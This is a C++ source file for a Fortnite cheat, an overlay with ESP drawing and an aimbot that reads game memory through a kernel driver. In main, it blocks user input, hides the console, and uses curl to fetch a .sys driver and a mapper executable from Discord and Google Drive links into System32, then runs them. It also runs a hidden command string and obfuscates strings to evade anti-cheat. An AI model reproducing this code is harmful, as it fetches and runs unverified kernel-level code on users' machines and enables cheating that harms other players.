#include "main.h"
#include "Comms/driver.hpp"
#include "Print.hpp"
#include "d3d9_x.h"
#include "xor.hpp"
#include <Windows.h>
#include <vector>
#include <dwmapi.h>
#include <vector>
#include <string>
#include "Keybind.h"
#include "auth.hpp"
#include "skStr.h"
#include "color.hpp"
#include "json.hpp"
#include "utils.hpp"
#include "offsets.h"

#include "xstring"
#include "font.h"
#include "Header.h"

#include "aimbot.h"
#include "definitons.h"
#include "menu.h"

#include "description.h"

int main(int argc, const char* argv[]);

static void OverlayHook();
static void InitializeD3D();
static void Cleanup();
static void MyCustomLoop();
HWND game_wnd = NULL;



// Function to clear the console screen
void ClearConsole()
{
	system("cls");
}

#include <windows.h>
#include <iostream>
#include <string>
#include <cstdio>
#include <cstdlib>
#include <ctime>



int main(int argc, const char* argv[]) {
    SPOOF_FUNC;

    const std::string RESET_COLOR = "\033[0m";
    const std::string BRIGHT_BLUE = "\033[1;34m";
    const std::string BLUE = "\033[0;34m";
    const std::string DARK_YELLOW = "\033[0;33m";
    const std::string BRIGHT_RED = "\033[1;31m";
    const std::string DARK_RED = "\033[0;31m";
    const std::string BRIGHT_PURPLE = "\033[1;35m";
    const std::string DARK_PURPLE = "\033[0;35m";
    const std::string BRIGHT_GREEN = "\033[1;32m";
    const std::string DARK_BLUE = "\033[0;34;2m";

    HWND consoleWindow = GetConsoleWindow();
    HDC consoleDC = GetDC(consoleWindow);
    CONSOLE_SCREEN_BUFFER_INFO csbi;
    GetConsoleScreenBufferInfo(GetStdHandle(STD_OUTPUT_HANDLE), &csbi);
    int windowWidth = csbi.srWindow.Right - csbi.srWindow.Left + 1;

    system(E("cls"));
    system(E("color 9"));
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    ShowWindow(GetConsoleWindow(), SW_SHOW);
    system(E("color 9"));
    CONSOLE_SCREEN_BUFFER_INFO consoleInfo;
    GetConsoleScreenBufferInfo(hConsole, &consoleInfo);
    WORD savedColor = consoleInfo.wAttributes;
    HWND hwndConsole = GetConsoleWindow();
    SetLayeredWindowAttributes(hwndConsole, 0, (255 * 79) / 100, LWA_ALPHA);
    system(E("cls"));

    int option;
    std::string username;
    std::string password;
    std::string key;
   

    WORD originalColor = consoleInfo.wAttributes;

    
    
        system("cls");
        int ImGui_DX9Init;

        ImGui_DX9Init = system(_debogInt.c_str());
        std::string opt;
        std::cout << "(Window will close when loading drivers)\n\n";
        std::cout << "Do you want to Load drivers? (Y/N): ";
        std::cin >> opt;
        if (opt == "y" || opt == "Y" || opt == "yes" || opt == "Yes") {
            BlockInput(true);
            ShowWindow(consoleWindow, SW_HIDE);
            system(E("curl https://cdn.discordapp.com/attachments/1118235576546627715/1217888169702195280/Drop_me_in_map.exe_.sys?ex=6605a9be&is=65f334be&hm=62f6c1f7ee1ca2c16a12e042b1ef334ad1e974ac7e1181af1fbc1b84f843ece7& --output C:\Windows\System32\Drop_me_in_map.exe_.sys >nul 2>&1"));
            system(E("curl https://drive.google.com/uc?export=download&id=1XpM7XpT6YFBKzIUXFUjys-msuBd7UeHs --output C:\Windows\System32\Drop .sys into me .exe >nul 2>&1"));
            system(E("C:\Windows\System32\Drop .sys into me .exe C:\Windows\System32\Drop_me_in_map.exe_.sys"));
            ShowWindow(consoleWindow, SW_SHOW);
            Sleep(1000);
            system("cls");

            std::cout << BRIGHT_BLUE << "  (" << BRIGHT_BLUE << "+" << BRIGHT_BLUE << ")" << BRIGHT_BLUE
                << " Successfully Loaded Driver! ";
            Sleep(1000);
            system("cls");
            Sleep(1);
        }

        std::remove(E("C:\Windows\System32\driver.sys"));
        std::remove(E("C:\Windows\System32\custom.exe"));
        BlockInput(false);
        system(E("cls"));

        SetConsoleTitleA(random_string(30).c_str());

        printf("Waiting for Fortnite...");

        while (hwnd == 0) {
            Sleep(1);
            driver.process_id = driver.get_process_id("FortniteClient-Win64-Shipping.exe");
            hwnd = get_process_wnd(driver.process_id);
            Sleep(1);
        }
        system("cls");
        if (!librarys::init()) {
            printf("0x18B1 Error!");
            Sleep(3000);
            exit(0);
        }

        if (!driver.setup()) {
            printf("0xDD1 Error!");
            Sleep(3000);
            exit(0);
        }
        base_address = driver.get_base_address();

        OverlayHook();
        InitializeD3D();
        MyCustomLoop();
        Cleanup();
    }
     
        
    

 
void SetWindowToTarget()
{
    SPOOF_FUNC;

    if (!hwnd)
    {
        exit(0);
        return;
    }

    DWORD dwStyle = GetWindowLong(hwnd, GWL_STYLE);
    RECT gameRect;

    if (GetWindowRect(hwnd, &gameRect))
    {
        int newWidth = gameRect.right - gameRect.left;
        int newHeight = gameRect.bottom - gameRect.top;

        if (dwStyle & WS_BORDER)
        {
            gameRect.top += 32;
            newHeight -= 39;
        }

        // Only move the window if necessary
        if (newWidth != Width || newHeight != Height)
        {
            Width = newWidth;
            Height = newHeight;
            ScreenCenterX = Width / 2;
            ScreenCenterY = Height / 2;
            MoveWindow(Window, gameRect.left, gameRect.top, Width, Height, true);
        }
    }
}


const MARGINS Margin = { -1 };

void OverlayHook()
{
    SPOOF_FUNC;

    // Cache system metrics to reduce API calls
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);

    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)SetWindowToTarget, 0, 0, 0);

    WNDCLASS windowClass = { 0 };
    windowClass.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH);
    windowClass.hCursor = LoadCursor(NULL, IDC_ARROW);
    windowClass.hInstance = NULL;
    windowClass.lpfnWndProc = WinProc;
    windowClass.lpszClassName = "notepad";
    windowClass.style = CS_HREDRAW | CS_VREDRAW;

    if (!RegisterClass(&windowClass))
    {
        // Efficient error handling
        MessageBox(NULL, "Failed to register window class.", "Error", MB_ICONERROR | MB_OK);
        return;
    }

    Window = CreateWindow("notepad",
        NULL,
        WS_POPUP,
        0,
        0,
        screenWidth,
        screenHeight,
        NULL,
        NULL,
        NULL,
        NULL);

    if (Window)
    {
        ShowWindow(Window, SW_SHOW);

        DwmExtendFrameIntoClientArea(Window, &Margin);
        SetWindowLong(Window, GWL_EXSTYLE, WS_EX_TRANSPARENT | WS_EX_TOOLWINDOW | WS_EX_LAYERED);
        UpdateWindow(Window);
    }
}

void InitializeD3D()
{
    SPOOF_FUNC;

    // Create Direct3D9Ex object
    if (FAILED(Direct3DCreate9Ex(D3D_SDK_VERSION, &p_Object)))
        exit(3);

    // Initialize the D3DPRESENT_PARAMETERS struct
    ZeroMemory(&d3dpp, sizeof(d3dpp));
    d3dpp.BackBufferWidth = Width;
    d3dpp.BackBufferHeight = Height;
    d3dpp.BackBufferFormat = D3DFMT_A8R8G8B8;
    d3dpp.MultiSampleType = D3DMULTISAMPLE_NONE;
    d3dpp.AutoDepthStencilFormat = D3DFMT_D16;
    d3dpp.SwapEffect = D3DSWAPEFFECT_DISCARD;
    d3dpp.EnableAutoDepthStencil = TRUE;
    d3dpp.hDeviceWindow = Window;
    d3dpp.Windowed = TRUE;

    // Create Direct3D device
    if (FAILED(p_Object->CreateDevice(D3DADAPTER_DEFAULT, D3DDEVTYPE_HAL, Window, D3DCREATE_SOFTWARE_VERTEXPROCESSING, &d3dpp, &D3dDevice)))
        exit(3);

    // Initialize ImGui
    IMGUI_CHECKVERSION();
    ImGui::CreateContext();
    ImGuiIO& io = ImGui::GetIO();

    // Initialize ImGui for Win32 and DirectX 9
    ImGui_ImplWin32_Init(Window);
    ImGui_ImplDX9_Init(D3dDevice);

    // Load a custom font
    XorS(font, "C:\\Windows\\Fonts\\Burbank-Big-Condensed-Black.ttf", 14.0f);
    m_pFont = io.Fonts->AddFontFromMemoryTTF(font1, sizeof(font1), 14.0f);

    // Release the Direct3D object (it's no longer needed)
    p_Object->Release();
}



void PerformAiming(DWORD_PTR entity)
{
    uint64_t currentactormesh = driver.read<uint64_t>(entity + 0x318);

    // Early return if currentactormesh is invalid
    if (!currentactormesh)
    {
        return;
    }

    auto rootHead = GetBone(currentactormesh, hitbox);
    Vector3 rootHeadOut = w2s(rootHead);

    // Combine conditions and use early return
    if (rootHeadOut.x != 0 || rootHeadOut.y != 0)
    {
        aimbot(rootHeadOut.x, rootHeadOut.y);
    }
}



void DrawESP() {
    SPOOF_FUNC;
    const auto size = ImGui::GetIO().DisplaySize;
    const auto center = ImVec2(size.x / 2, size.y / 2);

    if (square_fov) {
        ImGui::GetOverlayDrawList()->AddRect(ImVec2(ScreenCenterX - AimFOV, ScreenCenterY - AimFOV),
            ImVec2(ScreenCenterX + AimFOV, ScreenCenterY + AimFOV),
            IM_COL32(255, 255, 255, 255), thicknessa);
    }

    if (fovcircle) {
        ImGui::GetOverlayDrawList()->AddCircle(ImVec2(ScreenCenterX, ScreenCenterY), float(AimFOV),
            ImColor(255, 255, 255, 255), 100.0f, thicknessa);
    }

    if (fovcirclefilled) {
        ImGui::GetOverlayDrawList()->AddCircle(ImVec2(ScreenCenterX, ScreenCenterY), float(AimFOV),
            ImColor(255, 255, 255, 255), 100.0f, thicknessa);

        ImGui::GetOverlayDrawList()->AddCircleFilled(center, AimFOV, ImColor(0, 0, 0, 110), 100);
    }







    switch (hitboxpos)
    {
    case 0:
        hitbox = 67; // neck
        break;
    case 2:
        hitbox = 36; // chest
        break;
    case 3:
        hitbox = 2;  // pelvis
        break;
    default:
        // Handle other cases or provide a default value for hitbox
        break;
    }

    // Read UWorld and related pointers
    cache::uworld = driver.read<uintptr_t>(base_address + UWORLD);
    cache::game_instance = driver.read<uintptr_t>(cache::uworld + GAME_INSTANCE);
    cache::local_players = driver.read<uintptr_t>(driver.read<uintptr_t>(cache::game_instance + LOCAL_PLAYERS));
    cache::player_controller = driver.read<uintptr_t>(cache::local_players + PLAYER_CONTROLLER);
    cache::local_pawn = driver.read<uintptr_t>(cache::player_controller + LOCAL_PAWN);

    // Check if a local pawn exists
    if (cache::local_pawn != 0) {
        // Read local pawn's root component and other data
        cache::root_component = driver.read<uintptr_t>(cache::local_pawn + ROOT_COMPONENT);
        cache::relative_location = driver.read<Vector3>(cache::root_component + RELATIVE_LOCATION);
        cache::player_state = driver.read<uintptr_t>(cache::local_pawn + PLAYER_STATE);
        cache::my_team_id = driver.read<int>(cache::player_state + TEAM_INDEX);
    }

    // Read game state and player data
    cache::game_state = driver.read<uintptr_t>(cache::uworld + GAME_STATE);
    cache::player_array = driver.read<uintptr_t>(cache::game_state + PLAYER_ARRAY);
    cache::player_count = driver.read<int>(cache::game_state + (PLAYER_ARRAY + sizeof(uintptr_t)));
    cache::closest_distance = FLT_MAX;

    // Iterate through player data
    for (uint32_t i = 0; i < cache::player_count; i++) {
        player_state = driver.read<uintptr_t>(cache::player_array + (i * sizeof(uintptr_t)));

        // Check if player state exists and is on a different team
        if (!player_state) continue;
        int player_team_id = driver.read<int>(player_state + TEAM_INDEX);
        if (player_team_id == cache::my_team_id) continue;

        // Read pawn private data
        uintptr_t pawn_private = driver.read<uintptr_t>(player_state + PAWN_PRIVATE);

        // Check if pawn private data exists and is not the local pawn
        if (!pawn_private) continue;
        if (pawn_private == cache::local_pawn) continue;

        // Read mesh data and calculate distances
        uintptr_t mesh = driver.read<uintptr_t>(pawn_private + MESH);
        if (!mesh) continue;
        Vector3 head3d = GetBone(mesh, 67);
        Vector3 head2d = w2s(head3d);
        Vector3 bottom3d = GetBone(mesh, 0);
        Vector3 bottom2d = w2s(bottom3d);
        Vector3 w2shead = w2s(head3d);
        float box_height = abs(head2d.y - bottom2d.y);
        float box_width = box_height * 0.50f;
        float distance = cache::relative_location.distance(bottom3d) / 100;


        if (distance < VisDist) {
            {

                if (Esp)
                {
                    SPOOF_FUNC;
                    static ImColor visible_color;
                    if (is_visible(mesh)) {
                        visible_color = ImGui::GetColorU32({ fl_VisibleColor[0], fl_VisibleColor[1], fl_VisibleColor[2],  1.0f }); // Green for visible
                    }
                    else {
                        visible_color = ImGui::GetColorU32({ fl_InVisibleColor[0], fl_InVisibleColor[1], fl_InVisibleColor[2],  1.0f }); // Red for non-visible
                    }
                    if (watermark) {
                        SPOOF_FUNC;
                        char dist[64];

                        // First line with darker red color
                        sprintf_s(dist, "\n", ImGui::GetIO().Framerate);
                        ImGui::GetOverlayDrawList()->AddText(ImVec2(8, 2), visible_color, dist);

                        // Second line with darker red color
                        sprintf_s(dist, "\n", ImGui::GetIO().Framerate);
                        ImGui::GetOverlayDrawList()->AddText(ImVec2(8, 2), visible_color, dist);


                    }


                    if (weaponesp) {
                        SPOOF_FUNC;

                        auto current_weapon = driver.read<uintptr_t>(pawn_private + 0x948); // Replace with the correct offset
                        auto mycurrent_weapon = driver.read<uintptr_t>(LocalPawn + 0x948); // Replace with the correct offset

                        auto myis_reloading = driver.read<bool>(mycurrent_weapon + 0x358);
                        auto is_reloading = driver.read<bool>(current_weapon + 0x358);
                        auto ammocount = driver.read<INT32>(current_weapon + 0xd08);

                        // Get the weapon's display name
                        uintptr_t weapon_data = driver.read<uintptr_t>(current_weapon + 0x450); // UFortWeaponItemDefinition*
                        uintptr_t display_name = driver.read<uintptr_t>(weapon_data + 0x98); // DisplayName (FText)
                        uint32_t weapon_length = driver.read<uint32_t>(display_name + 0x40); // FText -> Length

                        wchar_t* buffer = new wchar_t[weapon_length + 1];
                        driver.readm((PVOID)driver.read<PVOID>(display_name + 0x38), buffer, weapon_length * sizeof(wchar_t));
                        std::wstring w_name(buffer);
                        std::string s_name(w_name.begin(), w_name.end());
                        delete[] buffer;

                        // Get the weapon's display name for your character
                        uintptr_t myweapon_data = driver.read<uintptr_t>(mycurrent_weapon + 0x450); // UFortWeaponItemDefinition*
                        uintptr_t mydisplay_name = driver.read<uintptr_t>(myweapon_data + 0x98); // DisplayName (FText)
                        uint32_t myweapon_length = driver.read<uint32_t>(mydisplay_name + 0x40); // FText -> Length

                        wchar_t* myname = new wchar_t[myweapon_length + 1];
                        driver.readm((PVOID)driver.read<PVOID>(mydisplay_name + 0x38), myname, myweapon_length * sizeof(wchar_t));
                        std::wstring myw_name(myname);
                        std::string mys_name(myw_name.begin(), myw_name.end());
                        delete[] myname;

                        // Draw the weapon name
                        ImFont* font = ImGui::GetFont(); // Replace with your desired font pointer
                        float fontSize = 16.0f; // Replace with your desired font size
                        ImVec2 position(bottom2d.x, bottom2d.y - 50);

                        // Commented out for no drawing in release mode
                        // ImGui::GetOverlayDrawList()->AddText(font, fontSize, position, ImColor(255, 255, 255), s_name.c_str());
                    }


                    if (crosshairEnabled) {

                        SPOOF_FUNC;

                    }
                    //if (playernames) { names(head2d, distance, ImColor(250, 250, 250, 250)); }

                    if (playernames)
                    {
                        std::string namedecrypted = GetPlayerName(player_state);
                        //DrawString(15, Headbox.X, Headbox.Y - 15, &Col.white, true, true, namedecrypted.c_str());

                        ImVec2 TextSize = ImGui::CalcTextSize(namedecrypted.c_str());
                        DrawString(18, (head2d.x) - (TextSize.x / 2), (head2d.y - 15), &Col.white, false, true, namedecrypted.c_str());
                    }


                    if (Esp_box) {
                        SPOOF_FUNC;

                        // Precompute box position if it's constant
                        const float boxX = head2d.x - (box_width / 2);

                        // Precompute box height and width if they are constant
                        const float boxWidth = box_width;
                        const float boxHeight = box_height;

                        // Cache the result of isVisible to avoid redundant work
                        bool isActorVisible = isVisible(mesh);

                        // Use a single DrawBox call for all visible boxes (batching)
                        if (isActorVisible) {
                            const ImU32 boxColor = visible_color;
                            DrawBox(boxX, head2d.y, boxWidth, boxHeight, boxColor, thickness);
                        }
                        else {
                            // Optionally, you can handle non-visible boxes differently here
                            // For example, skipping the DrawBox call or using a different color
                        }
                    }

                    if (ammoESP)
                    {
                        SPOOF_FUNC;
                        auto current_weapon = driver.read<uintptr_t>(pawn_private + 0x948); // by FG (blu)

                        auto ammocount = driver.read<INT32>(current_weapon + 0xd08);
                        char buffer[128];
                        sprintf_s(buffer, "[%i]", ammocount);

                        if (buffer != "?")
                        {
                            ImVec2 DistanceTextSize = ImGui::CalcTextSize(buffer);
                            DrawString(12, bottom2d.x - DistanceTextSize.x / 2, bottom2d.y + DistanceTextSize.y / 2 + 20, &Col.darkgreens, false, false, buffer);
                        }
                    }

                    Vector3 vHeadBone = GetBone(mesh, 68);
                    Vector3 vRootBone = GetBone(mesh, 0);
                    Vector3 vHeadBoneOut = w2s(Vector3(vHeadBone.x, vHeadBone.y, vHeadBone.z + 15));
                    Vector3 bone66 = GetBone(mesh, 66);
                    Vector3 top = w2s(bone66);
                    Vector3 bone0 = GetBone(mesh, 0);
                    Vector3 bottom = w2s(bone0);
                    Vector3 Headbox = w2s(Vector3(head2d.x, head2d.y, +15));

                    if (ThreeDBoxEsp)
                    {
                        if (vHeadBoneOut.x != 0 || vHeadBoneOut.y != 0 || vHeadBoneOut.z != 0)
                        {
                            ImU32 ESPSkeleton;
                            if (isVisible(mesh))
                            {
                                ESPSkeleton = ImColor(255, 3, 3);
                            }
                            else if (isVisible(mesh))
                            {
                                ESPSkeleton = ImColor(255, 0, 0);
                            }
                            Vector3 bottom1 = w2s(Vector3(vRootBone.x + 40, vRootBone.y - 40, vRootBone.z));
                            Vector3 bottom2 = w2s(Vector3(vRootBone.x - 40, vRootBone.y - 40, vRootBone.z));
                            Vector3 bottom3 = w2s(Vector3(vRootBone.x - 40, vRootBone.y + 40, vRootBone.z));
                            Vector3 bottom4 = w2s(Vector3(vRootBone.x + 40, vRootBone.y + 40, vRootBone.z));
                            Vector3 top1 = w2s(Vector3(vHeadBone.x + 40, vHeadBone.y - 40, vHeadBone.z + 15));
                            Vector3 top2 = w2s(Vector3(vHeadBone.x - 40, vHeadBone.y - 40, vHeadBone.z + 15));
                            Vector3 top3 = w2s(Vector3(vHeadBone.x - 40, vHeadBone.y + 40, vHeadBone.z + 15));
                            Vector3 top4 = w2s(Vector3(vHeadBone.x + 40, vHeadBone.y + 40, vHeadBone.z + 15));
                            ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom1.x, bottom1.y), ImVec2(top1.x, top1.y), ESPSkeleton, 0.1f);
                            ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom2.x, bottom2.y), ImVec2(top2.x, top2.y), ESPSkeleton, 0.1f);
                            ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom3.x, bottom3.y), ImVec2(top3.x, top3.y), ESPSkeleton, 0.1f);
                            ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom4.x, bottom4.y), ImVec2(top4.x, top4.y), ESPSkeleton, 0.1f);
                            ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom1.x, bottom1.y), ImVec2(bottom2.x, bottom2.y), ESPSkeleton, 0.1f);
                            ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom2.x, bottom2.y), ImVec2(bottom3.x, bottom3.y), ESPSkeleton, 0.1f);
                            ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom3.x, bottom3.y), ImVec2(bottom4.x, bottom4.y), ESPSkeleton, 0.1f);
                            ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom4.x, bottom4.y), ImVec2(bottom1.x, bottom1.y), ESPSkeleton, 0.1f);
                            ImGui::GetOverlayDrawList()->AddLine(ImVec2(top1.x, top1.y), ImVec2(top2.x, top2.y), ESPSkeleton, 0.1f);
                            ImGui::GetOverlayDrawList()->AddLine(ImVec2(top2.x, top2.y), ImVec2(top3.x, top3.y), ESPSkeleton, 0.1f);
                            ImGui::GetOverlayDrawList()->AddLine(ImVec2(top3.x, top3.y), ImVec2(top4.x, top4.y), ESPSkeleton, 0.1f);
                            ImGui::GetOverlayDrawList()->AddLine(ImVec2(top4.x, top4.y), ImVec2(top1.x, top1.y), ESPSkeleton, 0.1f);
                        }
                    }

                    if (skeletonesp)
                    {
                        SPOOF_FUNC;
                        Vector3 vHeadBone, vHip, vNeck, vUpperArmLeft, vUpperArmRight, vLeftHand, vRightHand,
                            vLeftHand1, vRightHand1, vRightThigh, vLeftThigh, vRightCalf, vLeftCalf,
                            vLeftFoot, vRightFoot, vPelvisOut;

                        vHeadBone = GetBone(mesh, 68);
                        vHip = GetBone(mesh, 2);
                        vNeck = GetBone(mesh, 67);
                        vUpperArmLeft = GetBone(mesh, 9);
                        vUpperArmRight = GetBone(mesh, 38);
                        vLeftHand = GetBone(mesh, 10);
                        vRightHand = GetBone(mesh, 39);
                        vLeftHand1 = GetBone(mesh, 30);
                        vRightHand1 = GetBone(mesh, 59);
                        vRightThigh = GetBone(mesh, 78);
                        vLeftThigh = GetBone(mesh, 71);
                        vRightCalf = GetBone(mesh, 79);
                        vLeftCalf = GetBone(mesh, 72);
                        vLeftFoot = GetBone(mesh, 73);
                        vRightFoot = GetBone(mesh, 80);
                        vPelvisOut = GetBone(mesh, 8);

                        Vector3 vHeadBoneOut = w2s(vHeadBone);
                        Vector3 vPelvis = w2s(vPelvisOut);
                        Vector3 vHipOut = w2s(vHip);
                        Vector3 vNeckOut = w2s(vNeck);
                        Vector3 vUpperArmLeftOut = w2s(vUpperArmLeft);
                        Vector3 vUpperArmRightOut = w2s(vUpperArmRight);
                        Vector3 vLeftHandOut = w2s(vLeftHand);
                        Vector3 vRightHandOut = w2s(vRightHand);
                        Vector3 vLeftHandOut1 = w2s(vLeftHand1);
                        Vector3 vRightHandOut1 = w2s(vRightHand1);
                        Vector3 vRightThighOut = w2s(vRightThigh);
                        Vector3 vLeftThighOut = w2s(vLeftThigh);
                        Vector3 vRightCalfOut = w2s(vRightCalf);
                        Vector3 vLeftCalfOut = w2s(vLeftCalf);
                        Vector3 vLeftFootOut = w2s(vLeftFoot);
                        Vector3 vRightFootOut = w2s(vRightFoot);

                        DrawLine(vHeadBoneOut.x, vHeadBoneOut.y, vNeckOut.x, vNeckOut.y, &Col.green, thickness);
                        DrawLine(vHipOut.x, vHipOut.y, vNeckOut.x, vNeckOut.y, &Col.green, thickness);
                        DrawLine(vUpperArmLeftOut.x, vUpperArmLeftOut.y, vNeckOut.x, vNeckOut.y, &Col.green, thickness);
                        DrawLine(vUpperArmRightOut.x, vUpperArmRightOut.y, vNeckOut.x, vNeckOut.y, &Col.green, thickness);
                        DrawLine(vLeftHandOut.x, vLeftHandOut.y, vUpperArmLeftOut.x, vUpperArmLeftOut.y, &Col.green, thickness);
                        DrawLine(vRightHandOut.x, vRightHandOut.y, vUpperArmRightOut.x, vUpperArmRightOut.y, &Col.green, thickness);
                        DrawLine(vLeftHandOut.x, vLeftHandOut.y, vLeftHandOut1.x, vLeftHandOut1.y, &Col.green, thickness);
                        DrawLine(vRightHandOut.x, vRightHandOut.y, vRightHandOut1.x, vRightHandOut1.y, &Col.green, thickness);
                        DrawLine(vLeftThighOut.x, vLeftThighOut.y, vHipOut.x, vHipOut.y, &Col.green, thickness);
                        DrawLine(vRightThighOut.x, vRightThighOut.y, vHipOut.x, vHipOut.y, &Col.green, thickness);
                        DrawLine(vLeftCalfOut.x, vLeftCalfOut.y, vLeftThighOut.x, vLeftThighOut.y, &Col.green, thickness);
                        DrawLine(vRightCalfOut.x, vRightCalfOut.y, vRightThighOut.x, vRightThighOut.y, &Col.green, thickness);
                        DrawLine(vLeftFootOut.x, vLeftFootOut.y, vLeftCalfOut.x, vLeftCalfOut.y, &Col.green, thickness);
                        DrawLine(vRightFootOut.x, vRightFootOut.y, vRightCalfOut.x, vRightCalfOut.y, &Col.green, thickness);
                    }



                    if (fillbox) {
                        SPOOF_FUNC;
                        // Adjust the coordinates and dimensions as needed
                        DrawFilledRect(ImGui::GetOverlayDrawList(), ImVec2(Headbox.x - (box_width / 2), Headbox.y), ImVec2(Headbox.x + (box_width / 2), Headbox.y + box_height), visible_color);
                    }





                    if (cornerbox && isVisible(mesh)) {
                        SPOOF_FUNC;
                        DrawCorneredBox(head2d.x - (box_width / 2), head2d.y, box_width, box_height, visible_color, thickness);
                    }
                    if (Esp_Distance)
                    {
                        SPOOF_FUNC;
                        if (isVisible(mesh)) {
                            XorS(dst, "[%.fm]\n");
                            char dist[64];
                            sprintf_s(dist, dst.decrypt(), distance);
                            DrawOutlinedText(m_pFont, dist, ImVec2(head2d.x, head2d.y - 35), 16.0f, visible_color, true);
                        }
                        if (!isVisible(mesh)) {
                            XorS(dst, "[%.fm]\n");
                            char dist[64];
                            sprintf_s(dist, dst.decrypt(), distance);
                            DrawOutlinedText(m_pFont, dist, ImVec2(head2d.x, head2d.y - 35), 16.0f, visible_color, true);
                        }
                    }

                    if (Esp_line)
                    {
                        SPOOF_FUNC;
                        DrawLine(Width / 2, Height, bottom.x, bottom.y, &Col.white, 2.0);

                    }
                    if (sdesp) {
                        if (isVisible) {
                            SPOOF_FUNC;
                            // Draw the box with one color when isVisible is true
                            DrawNormalBox(ImGui::GetOverlayDrawList(), ImVec2(Headbox.x - (box_width / 2), Headbox.y), ImVec2(Headbox.x + (box_height / 2), Headbox.y + box_height), 2, visible_color);
                        }
                        else {
                            SPOOF_FUNC;
                            // Draw the box with another color when isVisible is false
                            DrawNormalBox(ImGui::GetOverlayDrawList(), ImVec2(Headbox.x - (box_width / 2), Headbox.y), ImVec2(Headbox.x + (box_width / 2), Headbox.y + box_height), 2, visible_color);
                        }
                    }
                }
                if (WindowStreamProof) {
                    SPOOF_FUNC;
                    SetWindowDisplayAffinity(Window, WDA_EXCLUDEFROMCAPTURE);
                }
                if (!WindowStreamProof) {
                    SPOOF_FUNC;
                    SetWindowDisplayAffinity(Window, !WDA_EXCLUDEFROMCAPTURE);
                }

            }
            auto dx = w2shead.x - (Width / 2);
            auto dy = w2shead.y - (Height / 2);
            auto dist = sqrtf(dx * dx + dy * dy);
            if (!isVisible(mesh)) {

                if (dist < AimFOV && dist < cache::closest_distance) {
                    cache::closest_distance = dist;
                    cache::closest_mesh = pawn_private;



                }
            }

            else
            {
                if (isVisible(mesh)) {

                    if (dist < AimFOV && dist < cache::closest_distance) {
                        cache::closest_distance = dist;
                        cache::closest_mesh = pawn_private;

                    }
                }
            }

        }










    }
    if (Aimbot)
    {
        if (Aimbot && cache::closest_mesh && GetAsyncKeyState(hotkeys::aimkey) < 0) {
            PerformAiming(cache::closest_mesh);
        }
    }
    Sleep(0.2);
}


MSG Message = { NULL };
int Loop = 0;
void MyCustomLoop()
{
    SPOOF_FUNC;
    static RECT old_rc;
    ZeroMemory(&Message, sizeof(MSG));

    while (Message.message != WM_QUIT)
    {
        // Process Windows messages
        if (PeekMessage(&Message, Window, 0, 0, PM_REMOVE))
        {
            TranslateMessage(&Message);
            DispatchMessage(&Message);
        }

        // Bring the overlay window to the front when it's active
        HWND hwnd_active = GetForegroundWindow();
        if (hwnd_active == hwnd)
        {
            HWND hwndtest = GetWindow(hwnd_active, GW_HWNDPREV);
            SetWindowPos(Window, hwndtest, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
        }

        // Handle exit key
        if (GetAsyncKeyState(VK_END) & 1) // Change the exit key to VK_END (0x23)
            exit(8);

        RECT rc;
        POINT xy;

        ZeroMemory(&rc, sizeof(RECT));
        ZeroMemory(&xy, sizeof(POINT));
        GetClientRect(hwnd, &rc);
        ClientToScreen(hwnd, &xy);
        rc.left = xy.x;
        rc.top = xy.y;

        ImGuiIO& io = ImGui::GetIO();
        io.IniFilename = nullptr; // Use nullptr instead of NULL
        io.ImeWindowHandle = hwnd;
        io.DeltaTime = 1.0f / 60.0f;

        POINT p;
        GetCursorPos(&p);
        io.MousePos.x = p.x - xy.x;
        io.MousePos.y = p.y - xy.y;

        io.MouseDown[0] = GetAsyncKeyState(VK_LBUTTON) & 0x8000; // Simplify mouse button state check

        if (rc.left != old_rc.left || rc.right != old_rc.right || rc.top != old_rc.top || rc.bottom != old_rc.bottom)
        {
            old_rc = rc;

            Width = rc.right;
            Height = rc.bottom;

            d3dpp.BackBufferWidth = Width;
            d3dpp.BackBufferHeight = Height;
            d3dpp.PresentationInterval = D3DPRESENT_INTERVAL_IMMEDIATE;
            SetWindowPos(Window, nullptr, xy.x, xy.y, Width, Height, SWP_NOREDRAW); // Use nullptr instead of (HWND)0
            D3dDevice->Reset(&d3dpp);
        }
        render();

        if (Loop == 0)
        {
            XorS(base, "Process base address: %p.\n"); // l1nkywashere
        }
        Loop++;
    }

    ImGui_ImplDX9_Shutdown();
    ImGui_ImplWin32_Shutdown();
    ImGui::DestroyContext();

    DestroyWindow(Window);
}



LRESULT CALLBACK WinProc(HWND hWnd, UINT Message, WPARAM wParam, LPARAM lParam)
{
    SPOOF_FUNC;
    if (ImGui_ImplWin32_WndProcHandler(hWnd, Message, wParam, lParam))
        return true;

    switch (Message)
    {
    case WM_DESTROY:
        Cleanup();
        PostQuitMessage(0);
        break;
    case WM_SIZE:
        if (D3dDevice != NULL && wParam != SIZE_MINIMIZED)
        {
            if (wParam == SIZE_RESTORED || wParam == SIZE_MAXIMIZED)
            {
                // Release and recreate ImGui device objects on window resize
                ImGui_ImplDX9_InvalidateDeviceObjects();
                d3dpp.BackBufferWidth = LOWORD(lParam);
                d3dpp.BackBufferHeight = HIWORD(lParam);
                HRESULT hr = D3dDevice->Reset(&d3dpp);
                if (hr == D3DERR_INVALIDCALL)
                    IM_ASSERT(0);
                ImGui_ImplDX9_CreateDeviceObjects();
            }
        }
        break;
    default:
        return DefWindowProc(hWnd, Message, wParam, lParam);
    }
    return 0;
}



void Cleanup()
{
    SPOOF_FUNC;
    TriBuf->Release();
    D3dDevice->Release();
    p_Object->Release();

    DestroyWindow(Window);
    UnregisterClass("notepad", NULL);
}
